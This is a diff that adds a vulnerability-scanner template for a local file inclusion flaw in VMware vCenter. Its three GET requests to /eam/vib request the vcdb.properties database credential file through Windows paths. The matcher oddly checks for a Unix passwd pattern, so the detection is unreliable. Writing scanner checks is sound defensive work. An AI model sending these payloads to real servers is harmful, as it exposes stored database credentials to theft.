@@ -1,0 +1,21 @@
+name: vmware-vcenter-lfi
+groups:
+  windows_2008:
+    - method: GET
+      path: "/eam/vib?id=C:\\ProgramData\\VMware\\VMware+VirtualCenter\\vcdb.properties"
+      expression: |
+        response.status == 200 && "root:.*:0:0:".bmatches(response.body)
+  windows_other:
+    - method: GET
+      path: "/eam/vib?id=C:\\Documents+and+Settings\\All+Users\\Application+Data\\VMware\\VMware+VirtualCenter\\vcdb.properties"
+      expression: |
+        response.status == 200 && "root:.*:0:0:".bmatches(response.body)
+  vcenter_6_0_plus:
+    - method: GET
+      path: "/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties"
+      expression: |
+        response.status == 200 && "root:.*:0:0:".bmatches(response.body)
+detail:
+  author: dwisiswant0
+  links:
+    - https://kb.vmware.com/s/article/7960893
